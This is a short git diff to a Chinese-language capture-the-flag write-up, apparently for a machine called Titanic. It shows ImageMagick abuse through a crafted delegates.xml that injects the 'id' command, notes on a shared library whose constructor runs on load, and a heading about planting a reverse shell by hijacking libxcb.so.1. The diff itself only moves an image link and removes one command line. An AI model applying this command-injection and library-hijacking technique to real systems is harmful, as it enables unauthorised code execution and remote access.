@@ -195,9 +195,7 @@ command="id"         //这里注入了系统命令 id，目的是执行并输出
 developer@titanic:/dev/shm$ /usr/bin/magick identify delegates.xml  //验证
 
 developer@titanic:/dev/shm$ mv delegates.xml delegates.jpg
-developer@titanic:/dev/shm$ magick identify delegates.jpg
 ```
-![beautiful day](images/080312.png)
 
 ### [2]在当前工作目录中创建共享库：  
 ```
@@ -224,6 +222,7 @@ gcc -x c :GNU C 编译器,强制将输入解释为 C 语言
 
 __attribute__((constructor)) 会让这个函数 init() 在共享库被加载时自动运行，在 main() 之前执行
 ```
+![beautiful day](images/080312.png)
 ### [3]植入反弹shell_动态链接库劫持
 ![beautiful day](images/080314.png)
 反向shell在libxcb.so.1，把它拷贝到指定路径，挺重要一步的
